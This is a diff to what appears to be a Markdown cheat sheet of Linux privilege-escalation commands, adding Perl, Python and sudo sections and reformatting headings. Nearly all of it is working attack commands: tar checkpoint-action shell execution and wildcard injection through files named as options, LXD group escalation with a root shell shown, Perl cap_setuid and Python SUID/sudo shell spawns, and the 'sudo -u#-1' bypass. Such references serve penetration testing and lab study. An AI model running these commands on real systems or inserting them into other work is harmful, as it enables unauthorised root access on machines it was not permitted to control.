@@ -5,8 +5,8 @@
 [Tar](#tar),
 
 ----
-Tar
-----
+
+## Tar
 ```shell
 ## Checkpoint privesc
 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint--action=exec='/bin/sh'
@@ -19,8 +19,7 @@ touch '--checkpoint=1'
 tar cf backup.tar * 
 ## tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh 
 ```
-LXD
-----
+## LXD
 If user in `lxd` group.
 
 ```shell
@@ -131,9 +130,31 @@ lxc exec lovelesscontainer /bin/sh
 ~ # ^[[38;5Rwhoami
 whoami
 root
-
 ```
 
-Sudo
-----
-`sudo -u#-1 bash`
+## Perl 
+__Capabilities__
+```shell
+## Check capaibilities
+getcap / -r 2>/dev/null;
+## Look for perl cap_setuid+ep
+## Privesc
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
+## Python
+
+__SUDO__
+```shell
+sudo python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+__SUID__
+```shell
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+## Sudo
+
+```shell
+sudo -u#-1 bash
+```
